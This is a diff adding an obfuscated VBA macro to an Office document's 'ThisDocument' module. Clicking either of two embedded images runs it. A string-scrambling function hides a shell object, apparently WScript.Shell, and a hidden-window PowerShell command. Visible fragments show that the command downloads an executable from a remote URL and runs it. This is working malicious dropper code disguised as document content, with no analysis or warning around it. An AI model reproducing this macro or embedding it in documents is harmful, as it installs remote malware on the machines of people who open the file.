@@ -1,0 +1,43 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "0{00020906-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Attribute VB_Control = "Image2, 0, 0, MSForms, Image"
+Attribute VB_Control = "Image1, 1, 1, MSForms, Image"
+Public Sub Image1_Click()
+ZxqNKq
+End Sub
+Public Sub Image2_Click()
+ZxqNKq
+End Sub
+Public Function d(ByVal rlGNNoJ As String, ByVal hWrfM As String) As String
+For JzVuw = 1 To Len(rlGNNoJ)
+IjztnjO = jwKki(rlGNNoJ, JzVuw)
+If Not YXZqO(hWrfM, IjztnjO) Then
+d = IjztnjO & d
+End If
+Next
+End Function
+Public Function jwKki(ByVal quHVR As String, ByVal JzVuw As Integer) As String
+jwKki = Mid(quHVR, JzVuw, 1)
+End Function
+Public Function YXZqO(ByVal dVqRSOi As String, ByVal MZdTe As String) As Boolean
+YXZqO = InStr(dVqRSOi, MZdTe)
+End Function
+Public Sub ZCtgfss(ByVal ifZhqd As String)
+Set dytFP = CreateObject(d("lgl2seFvhwGSb5.Dt5Rpi4r08YcSxWk", "Gsb4Y250DF8wgkxRv"))
+dytFP.Run ifZhqd, 0
+End Sub
+Public Function vCivM() As String
+vCivM = d("K VGcv-jx Xs9Xsqap9X9yvb CfpRe-LR 4OpYTomn-1m GYnzedRdm2iB8h zXDwUB- Y6lkUleFmh9FEYs6re8PwV78opJ", "DqmkYTXjzRKBJCOUP7819GFxv64LE2fV") & CoLBCoP
+End Function
+Public Function CoLBCoP() As String
+CoLBCoP = d("L)qf8$q(HcveUxE0B.4Kkv)lXUHlBehMJSkL.tRXpVHir3UL0cS7H0WzB m4XJ6ocJZ-B XqtVcke05jYB8Kb7qO-U58w2eNL7v(;42)MLfZL$ VH,318'89ex9ke1K.LJ5atX9akUJqdK7niHbZKB/g8kozXlqR2egQL8na2h19Xc/XZmo1vc1U96.8ztMemYZrHu7oUVg9tBQHrAZa63t0iRmeX0dBA/1/kz:Y7p2tY6tz5hq2'VU(8e1MlQiQFLdaqBKolJH1nwR9oqADU.A)Q9Qtn4k9eLilAC08KbeAR0YW.37tqAeQ6N10.Qme0tzMsq2yRS4vKR Akt9ceQ1jZV3bZO-ZwX3ek1vNX(4;)A(5A1em6aHMHNe3qMl83i9FpUXMHmYeT6ZYRteqGKY::34Y7]hL4tVaPZ.VOXKI.Bm9UXeXRtsJ0LySX3UQ[z4=fXX$", "v32Y7M08qkUB9H1VQJR5L6KzX4AZ")
+End Function
+Public Sub ZxqNKq()
+ZCtgfss vCivM
+End Sub
